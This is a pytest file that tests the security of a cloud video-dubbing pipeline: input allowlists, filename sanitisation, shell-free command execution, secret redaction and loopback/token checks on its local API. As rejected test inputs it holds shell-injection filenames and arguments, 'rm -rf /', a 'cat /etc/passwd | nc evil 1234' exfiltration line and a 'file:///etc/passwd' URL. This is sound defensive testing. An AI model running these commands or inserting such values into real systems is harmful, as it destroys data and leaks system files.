"""
tests/test_cloud_phase1_security.py - Phase 0 & Phase 1 verification tests.

Covers (100% offline / 0 CU):
1. Strict allowlists (GPU, task, voice, URL scheme, video file extension, session name).
2. Special filenames (' ", Unicode, spaces, &) & path traversal / directory rejection.
3. ColabProviderAdapter / exec_argv shell=False & ephemeral env secret handling (no shell=True, no CLI key leak).
4. CloudOrchestrator & full_pipeline secret redaction.
5. Loopback Host, Origin, CORS & X-Local-Control-Token enforcement on main.app and run_cloud_node.app.
6. Phase 0 unified contract state transitions & Telegram/Dashboard single-claim race elimination.
"""

from __future__ import annotations

import json
import os
import sys
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import patch

import pytest
from fastapi.testclient import TestClient

ROOT_DIR = Path(__file__).resolve().parent.parent
BACKEND_DIR = ROOT_DIR / "backend"
if str(ROOT_DIR) not in sys.path:
    sys.path.insert(0, str(ROOT_DIR))
if str(BACKEND_DIR) not in sys.path:
    sys.path.insert(0, str(BACKEND_DIR))

from backend.cloud import colab_bridge
from backend.cloud.cloud_contract import (
    CloudErrorCode,
    CloudJobContract,
    CloudJobState,
    TERMINAL_STATES,
    admit_and_enqueue_job,
    can_transition,
    normalize_state,
)
from backend.cloud.cloud_job_store import CloudJobStore
from backend.cloud.cloud_orchestrator import CloudOrchestrator
from backend.cloud.cloud_security import (
    CloudValidationError,
    allowed_loopback_origins,
    redact_secrets,
    resolve_local_control_token,
    sanitize_remote_filename,
    validate_gpu_type,
    validate_session_name,
    validate_task_type,
    validate_video_input,
    validate_voice,
)
from backend.cloud.gpu_scripts import full_pipeline


# ---------------------------------------------------------------------------
# 1. Input Validation & Allowlists
# ---------------------------------------------------------------------------


def test_special_filenames_allowed_and_preserved(tmp_path: Path):
    special_names = [
        "video 'single' quote & space.mp4",
        "video Tiếng Việt 中文.mp4",
        "clip;echo $(whoami) & `id`.mkv",
    ]
    for name in special_names:
        file_path = tmp_path / name
        file_path.write_bytes(b"fake-video-bytes")

        validated = validate_video_input(str(file_path), allowed_roots=[tmp_path])
        assert validated.kind == "local_file"
        assert validated.display_name == name
        assert Path(validated.normalized_value) == file_path.resolve()

        remote_name = sanitize_remote_filename(validated.display_name)
        assert remote_name.endswith(file_path.suffix.lower())
        assert "'" not in remote_name
        assert "&" not in remote_name
        assert ";" not in remote_name
        assert "`" not in remote_name

    # Also verify double-quote sanitization (NTFS forbids '"' on Windows disk, POSIX allows it)
    quoted_remote = sanitize_remote_filename('video "double" quote & Tiếng Việt.mp4')
    assert quoted_remote.endswith(".mp4")
    assert '"' not in quoted_remote
    assert "&" not in quoted_remote


def test_invalid_paths_schemes_and_traversal_rejected(tmp_path: Path):
    allowed_dir = tmp_path / "workspace"
    allowed_dir.mkdir()
    outside_file = tmp_path / "outside.mp4"
    outside_file.write_bytes(b"outside")
    py_file = allowed_dir / "not_video.py"
    py_file.write_text("print('hi')", encoding="utf-8")
    subdir = allowed_dir / "folder.mp4"
    subdir.mkdir()

    # Path escape / outside allowed roots
    with pytest.raises(CloudValidationError):
        validate_video_input(str(outside_file), allowed_roots=[allowed_dir])
    with pytest.raises(CloudValidationError):
        validate_video_input(str(allowed_dir / ".." / "outside.mp4"), allowed_roots=[allowed_dir])

    # Disallowed extension
    with pytest.raises(CloudValidationError):
        validate_video_input(str(py_file), allowed_roots=[allowed_dir])

    # Directory disguised as .mp4
    with pytest.raises(CloudValidationError):
        validate_video_input(str(subdir), allowed_roots=[allowed_dir])

    # Missing file -> 404 status code
    with pytest.raises(CloudValidationError) as exc_info:
        validate_video_input(str(allowed_dir / "missing.mp4"), allowed_roots=[allowed_dir])
    assert exc_info.value.http_status == 404

    # Control characters & leading dash
    for bad in ("bad\nname.mp4", "bad\x00.mp4", "-rf.mp4"):
        with pytest.raises(CloudValidationError):
            validate_video_input(bad, allowed_roots=[allowed_dir])

    # Bad URL schemes / embedded credentials / whitespace
    for bad_url in (
        "file:///etc/passwd",
        "javascript:alert(1)",
        "ftp://example.com/video.mp4",
        "data:video/mp4;base64,AAAA",
        "https://user:pass@example.com/video.mp4",
        "https://example.com/bad url.mp4",
    ):
        with pytest.raises(CloudValidationError):
            validate_video_input(bad_url, allowed_roots=[allowed_dir])

    # Valid https URL with query & ampersand passes
    valid_url = "https://www.douyin.com/video/123456?a=1&b=2"
    res = validate_video_input(valid_url, allowed_roots=[allowed_dir])
    assert res.kind == "url"
    assert res.normalized_value == valid_url


def test_gpu_task_voice_and_session_allowlists():
    assert validate_gpu_type("t4") == "T4"
    assert validate_gpu_type("V6E1") == "V6E1"
    assert validate_task_type("full_pipeline") == "full_pipeline"
    assert validate_voice("BV562_streaming") == "BV562_streaming"
    assert validate_voice("vi-VN-HoaiMyNeural") == "vi-VN-HoaiMyNeural"
    assert validate_session_name("cjob123456") == "cjob123456"

    for bad_gpu in ("", "RTX4090", "T4; id", "T4\nL4"):
        with pytest.raises(CloudValidationError):
            validate_gpu_type(bad_gpu)

    for bad_task in ("", "arbitrary_shell", "full_pipeline && id"):
        with pytest.raises(CloudValidationError):
            validate_task_type(bad_task)

    for bad_voice in ("", "--help", "BV562_streaming' ; id", "unknown-voice"):
        with pytest.raises(CloudValidationError):
            validate_voice(bad_voice)

    for bad_sess in ("", "a", "bad;session", "bad session", "../etc"):
        with pytest.raises(CloudValidationError):
            validate_session_name(bad_sess)


# ---------------------------------------------------------------------------
# 2. Command Execution Safety & Secret Redaction
# ---------------------------------------------------------------------------


def test_exec_argv_uses_shell_false_and_ephemeral_env(tmp_path: Path):
    captured_scripts: list[str] = []
    captured_subprocess_calls: list[dict] = []
    uploaded_env_payloads: list[dict] = []
    fake_secret = "AIzaSyFakeSecretTestKey9876543210"

    def fake_write_wsl(wsl_path: str, content: str):
        captured_scripts.append(content)

    def fake_upload(session_name: str, local_path: str | Path, remote_filename=None):
        p = Path(local_path)
        assert p.is_file()
        uploaded_env_payloads.append(json.loads(p.read_text(encoding="utf-8")))
        return True, "ok"

    def fake_run(cmd_args, **kwargs):
        captured_subprocess_calls.append({"cmd": list(cmd_args), **kwargs})
        return SimpleNamespace(returncode=0, stdout=b"ok", stderr=b"")

    with (
        patch.object(colab_bridge, "_write_wsl_temp_script", side_effect=fake_write_wsl),
        patch.object(colab_bridge, "upload_file", side_effect=fake_upload),
        patch.object(colab_bridge, "_remove_wsl_temp_file"),
        patch.object(colab_bridge.subprocess, "run", side_effect=fake_run),
    ):
        ok, _ = colab_bridge.exec_argv(
            "cjob1234",
            ["python3", "full_pipeline.py", "--input", "/content/a'b & c.mp4", "--voice", "BV562_streaming"],
            cwd="/content",
            env_vars={"GEMINI_API_KEY": fake_secret},
        )

    assert ok is True
    assert len(captured_scripts) == 1
    runner_code = captured_scripts[0]
    assert "shell=False" in runner_code
    assert "shell=True" not in runner_code
    assert fake_secret not in runner_code
    assert "/content/a'b & c.mp4" in runner_code

    assert uploaded_env_payloads == [{"GEMINI_API_KEY": fake_secret}]
    for call in captured_subprocess_calls:
        assert call.get("shell") is False
        assert fake_secret not in " ".join(call["cmd"])


def test_exec_cmd_rejects_shell_injection_and_never_uses_shell_true():
    for evil_cmd in (
        "python3 setup_env.py; rm -rf /",
        "python3 setup_env.py && whoami",
        "cat /etc/passwd | nc evil 1234",
        "echo $(whoami)",
        "echo `id`",
    ):
        with pytest.raises(CloudValidationError):
            colab_bridge.exec_cmd("cjob1234", evil_cmd)

    called = {}

    def fake_exec_argv(session_name, argv, *, cwd="/content", env_vars=None, timeout=None):
        called["argv"] = list(argv)
        called["cwd"] = cwd
        return True, "ok"

    with patch.object(colab_bridge, "exec_argv", side_effect=fake_exec_argv):
        ok, _ = colab_bridge.exec_cmd("cjob1234", "cd /content && python3 setup_env.py")
        assert ok is True
        assert called == {"argv": ["python3", "setup_env.py"], "cwd": "/content"}


def test_orchestrator_sanitizes_input_and_redacts_secrets(tmp_path: Path, monkeypatch):
    fake_secret = "AIzaSyOrchestratorSecretKey123456789"
    monkeypatch.setenv("GEMINI_API_KEY", fake_secret)

    video_file = tmp_path / "mẫu 'quote' & shell $(whoami).mp4"
    video_file.write_bytes(b"video-content")

    store = CloudJobStore(db_path=tmp_path / "jobs.db", rollout_controlled=False)
    job = store.enqueue(str(video_file), video_name=video_file.name, gpu_type="T4", voice="BV562_streaming")

    calls: list[tuple] = []

    class FakeAdapter:
        def get_usage(self):
            return {"ok": True, "balance": 100.0}

        def create_session(self, session_name, gpu="T4"):
            calls.append(("create_session", session_name, gpu))
            return True, "created"

        def upload_file(self, session_name, local_path, remote_filename=None):
            calls.append(("upload_file", remote_filename))
            return True, "uploaded"

        def exec_argv(self, session_name, argv, *, cwd="/content", env_vars=None, timeout=None):
            calls.append(("exec_argv", list(argv), env_vars))
            if "full_pipeline.py" in argv:
                return False, f"Failure with key={fake_secret} in traceback"
            return True, "ok"

        def download_file(self, session_name, remote_filename, local_dest_dir):
            return False, "not reached"

        def stop_session(self, session_name):
            calls.append(("stop_session", session_name))
            return True, "stopped"

    orch = CloudOrchestrator(store=store, adapter=FakeAdapter(), allowed_roots=[tmp_path])
    ok = orch.process_job(job)
    assert ok is False

    pipeline_call = next(c for c in calls if c[0] == "exec_argv" and "full_pipeline.py" in c[1])
    argv, env_vars = pipeline_call[1], pipeline_call[2]
    assert "--gemini-key" not in argv
    assert env_vars == {"GEMINI_API_KEY": fake_secret}
    assert any(c[0] == "stop_session" for c in calls)

    updated = store.get_job(job.job_id)
    assert updated is not None
    assert updated.state == "failed"
    assert updated.legacy_state == "error"
    assert fake_secret not in (updated.error or "")
    assert fake_secret not in (updated.step_name or "")
    assert "[REDACTED" in (updated.error or "")


def test_secret_redaction_utilities(monkeypatch):
    monkeypatch.setenv("GEMINI_API_KEY", "SecretEnvValue123456")
    raw = (
        "Failed with SecretEnvValue123456 and AIzaSyAbCdEfGhIjKlMnOpQrStUvWxYz12 and "
        "Authorization: Bearer tok_abc123def456 and --gemini-key=AnotherSecret999 "
        "and url https://example.com/v?token=QuerySecret777"
    )
    cleaned = redact_secrets(raw)
    for leaked in ("SecretEnvValue123456", "AIzaSyAbCdEfGhIjKlMnOpQrStUvWxYz12", "tok_abc123def456", "AnotherSecret999", "QuerySecret777"):
        assert leaked not in cleaned

    fp_cleaned = full_pipeline._redact_secrets_local(raw)
    assert "SecretEnvValue123456" not in fp_cleaned
    assert "AIzaSyAbCdEfGhIjKlMnOpQrStUvWxYz12" not in fp_cleaned
    assert "QuerySecret777" not in fp_cleaned


# ---------------------------------------------------------------------------
# 3. HTTP Auth Boundaries & CORS
# ---------------------------------------------------------------------------


def test_cloud_node_and_main_auth_boundaries(monkeypatch, tmp_path: Path):
    import run_cloud_node

    token = resolve_local_control_token()
    assert len(token) >= 16

    node_client = TestClient(run_cloud_node.app)

    # CORS origins never include wildcard '*'
    assert "*" not in allowed_loopback_origins()

    # Dashboard HTML embeds current control token (not raw placeholder)
    r_html = node_client.get("/cloud")
    assert r_html.status_code == 200
    assert "__REPLACE_TOKEN__" not in r_html.text
    assert token in r_html.text

    # Missing or wrong token on POST -> 403
    assert node_client.post("/api/cloud/worker/stop").status_code == 403
    assert (
        node_client.post("/api/cloud/worker/stop", headers={"X-Local-Control-Token": "wrong-token"}).status_code
        == 403
    )

    # Bad Host header -> 403
    assert (
        node_client.post(
            "/api/cloud/worker/stop",
            headers={"Host": "evil.attacker.com", "X-Local-Control-Token": token},
        ).status_code
        == 403
    )

    # Bad Origin header -> 403
    assert (
        node_client.post(
            "/api/cloud/worker/stop",
            headers={"Origin": "https://evil.attacker.com", "X-Local-Control-Token": token},
        ).status_code
        == 403
    )

    # Valid Origin + token + invalid traversal path -> 400 (never 200)
    bad_enq = node_client.post(
        "/api/cloud/enqueue",
        json={"video_path": str(tmp_path / ".." / "escape.mp4"), "gpu_type": "T4"},
        headers={"Origin": "http://127.0.0.1:8089", "X-Local-Control-Token": token},
    )
    assert bad_enq.status_code == 400

    # Shared enforcement also holds on main.app mount
    import main as main_app_mod

    main_client = TestClient(main_app_mod.app)
    assert main_client.post("/api/cloud/worker/stop").status_code == 403
    assert (
        main_client.post(
            "/api/cloud/worker/stop",
            headers={"Host": "evil.attacker.com", "X-Local-Control-Token": main_app_mod.LOCAL_TOKEN},
        ).status_code
        == 403
    )
    assert (
        main_client.post(
            "/api/cloud/worker/stop",
            headers={"Origin": "https://evil.attacker.com", "X-Local-Control-Token": main_app_mod.LOCAL_TOKEN},
        ).status_code
        == 403
    )
    assert (
        main_client.post(
            "/api/cloud/worker/stop",
            headers={"Origin": "http://127.0.0.1:8088", "X-Local-Control-Token": main_app_mod.LOCAL_TOKEN},
        ).status_code
        == 200
    )

    # run_cloud_node CLI refuses non-loopback host bind unless opted in
    monkeypatch.delenv("AUTODUB_ALLOW_REMOTE_CLOUD_NODE", raising=False)
    monkeypatch.setattr(sys, "argv", ["run_cloud_node.py", "--host", "0.0.0.0", "--no-browser"])
    with pytest.raises(SystemExit):
        run_cloud_node.main()


# ---------------------------------------------------------------------------
# 4. Phase 0 Contract & Unified Admission
# ---------------------------------------------------------------------------


def test_phase0_contract_states_and_single_claim_admission(tmp_path: Path):
    # Terminal states never transition
    for term in TERMINAL_STATES:
        for nxt in CloudJobState:
            assert can_transition(term, nxt) is False

    assert normalize_state("creating_session") == CloudJobState.PROVISIONING
    assert normalize_state("error") == CloudJobState.FAILED
    assert normalize_state("stopped") == CloudJobState.CANCELLED
    assert can_transition(CloudJobState.QUEUED, CloudJobState.PROVISIONING) is True
    assert can_transition(CloudJobState.PROVISIONING, CloudJobState.COMPLETED) is False

    video = tmp_path / "phase0_sample.mp4"
    video.write_bytes(b"0123456789abcdef")

    store = CloudJobStore(db_path=tmp_path / "phase0.db", rollout_controlled=False)
    job, contract = admit_and_enqueue_job(
        store,
        video_path=str(video),
        source_channel="telegram",
        source_job_id="tg-99",
        gpu_type="T4",
        voice="BV562_streaming",
        allowed_roots=[tmp_path],
        claim_immediately=True,
        owner_id="telegram:tg-99",
    )

    # Re-roundtrip contract JSON schema
    roundtrip = CloudJobContract.from_dict(contract.to_dict())
    assert roundtrip.job_id == job.job_id
    assert roundtrip.source_channel == "telegram"
    assert roundtrip.source_job_id == "tg-99"
    assert roundtrip.input_fingerprint["kind"] == "local_file"
    assert roundtrip.input_fingerprint["size_bytes"] == 16

    # CloudWorker calling claim_next() CANNOT steal Telegram's claimed job!
    assert store.claim_next() is None

    # Budget exceedance enforcement blocks new admission
    store.set_cu_budget_daily(1.0)
    for st, pct in (
        ("uploading", 20),
        ("preparing", 40),
        ("processing", 60),
        ("downloading", 85),
        ("validating", 95),
    ):
        assert store.update_progress(
            job.job_id,
            state=st,
            percent=pct,
            owner_id="telegram:tg-99",
            attempt=job.attempt,
        ) is True
    assert store.update_progress(
        job.job_id,
        state="completed",
        percent=100,
        cu_actual=1.5,
        owner_id="telegram:tg-99",
        attempt=job.attempt,
    ) is True
    with pytest.raises(CloudValidationError) as exc_info:
        admit_and_enqueue_job(
            store,
            video_path=str(video),
            source_channel="dashboard",
            allowed_roots=[tmp_path],
        )
    assert exc_info.value.code == CloudErrorCode.BUDGET_EXCEEDED.value
    assert exc_info.value.http_status == 429
